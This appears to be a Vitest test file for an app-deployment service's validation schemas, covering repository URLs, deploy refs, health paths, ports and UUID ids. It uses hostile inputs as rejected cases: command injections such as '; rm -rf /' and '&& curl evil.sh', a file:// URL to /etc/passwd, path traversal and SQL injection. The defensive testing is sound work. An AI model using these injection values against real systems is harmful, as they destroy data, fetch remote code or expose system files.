import { describe, it, expect } from 'vitest';
import { createAppSchema, deployAppSchema, isValidId } from './validation.js';

describe('validation', () => {
  it('accepts valid app payloads', () => {
    const ok = createAppSchema.safeParse({ name: 'my-api', repositoryUrl: 'https://github.com/example/my-api' });
    expect(ok.success).toBe(true);
    const ok2 = createAppSchema.safeParse({ name: 'a1', repositoryUrl: 'git@github.com:example/repo.git' });
    expect(ok2.success).toBe(true);
  });

  it('rejects bad names and URLs', () => {
    expect(createAppSchema.safeParse({ name: '-bad', repositoryUrl: 'https://github.com/a/b' }).success).toBe(false);
    expect(createAppSchema.safeParse({ name: '', repositoryUrl: 'https://github.com/a/b' }).success).toBe(false);
    expect(createAppSchema.safeParse({ name: 'ok', repositoryUrl: 'file:///etc/passwd' }).success).toBe(false);
    expect(createAppSchema.safeParse({ name: 'ok', repositoryUrl: 'http://github.com/a/b' }).success).toBe(false);
    expect(createAppSchema.safeParse({ name: 'ok', repositoryUrl: 'not a url' }).success).toBe(false);
    // command injection attempts in URLs must be rejected
    expect(createAppSchema.safeParse({ name: 'ok', repositoryUrl: 'https://github.com/a/b; rm -rf /' }).success).toBe(false);
    expect(createAppSchema.safeParse({ name: 'ok', repositoryUrl: 'https://github.com/a/b && curl evil.sh' }).success).toBe(false);
  });

  it('validates deploy options strictly', () => {
    expect(deployAppSchema.safeParse({}).success).toBe(true);
    expect(deployAppSchema.safeParse({ ref: 'main' }).success).toBe(true);
    expect(deployAppSchema.safeParse({ ref: 'release/v1.2.3' }).success).toBe(true);
    expect(deployAppSchema.safeParse({ ref: 'main; echo pwned' }).success).toBe(false);
    expect(deployAppSchema.safeParse({ healthPath: '/healthz' }).success).toBe(true);
    expect(deployAppSchema.safeParse({ healthPath: 'health' }).success).toBe(false);
    expect(deployAppSchema.safeParse({ containerPort: 70000 }).success).toBe(false);
    expect(deployAppSchema.safeParse({ containerPort: 3000, extra: true }).success).toBe(false);
  });

  it('validates ids as uuids to prevent traversal/injection', () => {
    expect(isValidId('6f1c2b3a-1111-4222-8333-444455556666')).toBe(true);
    expect(isValidId('../../etc/passwd')).toBe(false);
    expect(isValidId('abc')).toBe(false);
    expect(isValidId("'; drop table apps; --")).toBe(false);
  });
});
